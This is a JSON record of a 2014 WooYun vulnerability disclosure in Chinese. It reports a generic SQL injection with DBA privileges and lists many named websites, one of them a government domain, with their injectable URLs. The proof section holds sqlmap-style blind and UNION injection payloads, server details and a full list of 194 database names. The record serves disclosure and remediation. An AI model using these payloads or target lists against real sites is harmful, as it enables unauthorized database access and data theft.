{"id": 55762, "wybug_id": "wooyun-2014-059986", "wybug_title": "某软件公司程序存在通用型（DBA权限）SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2014-05-09 16:10", "wybug_open_date": "2014-08-07 16:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向公众公开  简要描述： RT 详细说明：  谷歌：利梭网络http://www.xxssfj.gov.cn/http://www.xxxgtj.gov.cn/http://www.jhqz.com/http://www.xxairpull.com/http://www.sxcompany.cn/http://www.34455.com.cn/http://www.riugor.com/http://www.hnyxyz.com/http://www.xxzhongcai.com/http://www.yqdbj.com/http://www.whwxjx.com/http://www.xxxiangyi.com/http://www.jlmgjx.com/http://www.hnhffy.com/http://www.36699.cn/http://www.xxktdq.com/http://www.xxhtfm.com/http://www.dbxnp.com/http://www.xinxi365.cn/http://www.yangzhushebei.com/http://www.cxnjzzc.com/http://www.spyxuesci.asia/http://www.xhzdjx.com/注入点是id参数，列表如下：http://www.xxssfj.gov.cn/Picture_Show.php?id=122http://www.xxssfj.gov.cn/Info_Show.php?id=1016http://www.xxssfj.gov.cn/Info_Show.php?ColumnID=14&id=949http://www.xxairpull.com/cpinfo.php?cpid=467http://www.xxairpull.com/newsinfo.php?id=87&classid=12http://www.xxairpull.com/newsinfo.php?id=91http://www.34455.com.cn/newsinfo.php?id=181&classid=11http://www.34455.com.cn/cpinfo.php?cpid=476http://www.34455.com.cn/cp_type.php?smallclassid=96http://www.34455.com.cn/qyinfo.php?id=31http://www.riugor.com/newsinfo.php?id=157&classid=11http://www.riugor.com/cpinfo.php?cpid=451http://www.riugor.com/news_class.php?classid=11http://www.riugor.com/english/cpinfo.php?cpid=451http://www.riugor.com/cp_type.php?smallclassid=98http://www.xxzhongcai.com/jszcinfo.php?tl_id=31http://www.xxzhongcai.com/cpinfo.php?product_id=2http://www.yqdbj.com/newsinfo.php?id=32... ...   漏洞证明：  http://www.xxssfj.gov.cn/\nPlace: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1003' AND 4805=4805 AND 'JVIW'='JVIW    Type: UNION query    Title: MySQL UNION query (NULL) - 14 columns    Payload: id=1003' UNION ALL SELECT CONCAT(0x7165666171,0x69505559437473675171,0x71686b6e71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL 5current user is DBA:    True\ntables:\navailable databases [194]:[*] #mysql50#sanyuan-ygt[*] #mysql50#shengxin-ygt-303[*] #mysql50#yuxin-ygt[*] 334a[*] 334b[*] 334c[*] 34455cn[*] aipuli[*] atn[*] baixingyangzhu[*] baliao[*] bdh[*] beiyong[*] bolangsha[*] boshi[*] cainuan[*] diyiyiyuan[*] dongshengjx[*] dongyuanzds[*] dstsj[*] emiao[*] fanshi[*] fengshou[*] gaosheng[*] gaoyao[*] gerui2[*] geruien2[*] gkzy[*] gkzyeng[*] guangrunlbg[*] guangyuanjianzhu[*] guifang[*] guolu[*] guqiang[*] haibinyy[*] haoge[*] hdjnhb[*] henanyongxing[*] hengshengyangzhi[*] hengxingzs[*] hnyzsb[*] hongda[*] hongdahuagong[*] hongguang[*] hongguanyao[*] hongkai[*] hongkang[*] hongyuanzd[*] hongyuanzhengd[*] hqshanghui[*] huadongzhiguana[*] huangguanjiudian[*] huatongsj[*] huaweizx[*] huazheng[*] huitong[*] hysfjx[*] hysfsb[*] hyzdd[*] hyzddj[*] ido[*] information_schema[*] iweila[*] jiameisy[*] jianghe[*] jiangheeng[*] jingfeng[*] jingfusp[*] jingxiaobo[*] jinjihuagong[*] jinshun[*] jinxia[*] jinxia521[*] jinzhenjx[*] jmsy[*] junfenqu[*] juzhongzhuangshi[*] kailily[*] kangdi[*] kangfu[*] kanglinqx[*] kelida[*] keruida[*] kunlun[*] liancheng[*] lierguolv[*] lingyuan[*] lisuo[*] lisuoitli[*] longsheng[*] longtengsc[*] lsqy[*] lurun[*] mamawang[*] menzhen[*] mingrendb[*] mingtai[*] mysql[*] nengyuan[*] nuandongbwb[*] odf[*] opk[*] oudifei[*] pulongny[*] qimei[*] qizhongji[*] qudongjinghua[*] rifeng[*] rongxin[*] ruige[*] ruigecd[*] ruiliqm[*] rundongjianzhu[*] saikugaizhuang[*] sanchengjx[*] sanjiusw[*] sanyang[*] sanyuan[*] sanyuantang[*] shanhe[*] shengdadianyuan[*] shengqiming[*] shengteng[*] shengxin[*] shennong[*] shiqiang[*] shiqiangjixie[*] sifangbs[*] sihaifangfu[*] ssssssss[*] tengfeijixie[*] test[*] tianruiyeya[*] tianruiyy[*] tonghuigm[*] tongyong[*] tongzhoujixie[*] wajueji[*] wantongfm[*] webbase[*] weiliang[*] woww[*] xfyjps[*] xianfeng[*] xiangsu[*] xiangyuansp[*] xianlonggy[*] xielijx[*] xincheng[*] xinfangbb[*] xinfeiyz[*] xinhe[*] xinpujx434[*] xintiandi[*] xinxiangguolu188[*] xkhb[*] xqpudong[*] xqyhzxh[*] xtlwood[*] xtlwooden[*] xxbangniwang[*] xxgerui[*] xxgeruien[*] xxguolu[*] xxhgj[*] xxkjgs[*] xxshuibeng[*] xxssfj[*] xxyouth[*] xxyouthbbs[*] xyb[*] yahua623[*] yangzhujidi[*] ycyzsb[*] yejin[*] yimutian[*] yingda[*] yingdajx[*] yingdajxeng[*] yixiang[*] yixin[*] yizhuo[*] yongxing2013[*] yongxingyangzhi[*] yuanhengjx[*] yuanman[*] zhendajx[*] zhengde[*] zhengshuo[*] zhongxin[*] zhongxingsp[*] zhongyuanlingkong[*] zhongzhisiliao[*] zjjf\n   修复方案：  数字型参数id修复方案为：在接收参数id时，对其进行强制整型转换即可。int id= Integer.parseInt(\"id\") ;//对id整型转换后再进行下一步的数据库查询更安全   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-12 18:51 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开联系渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}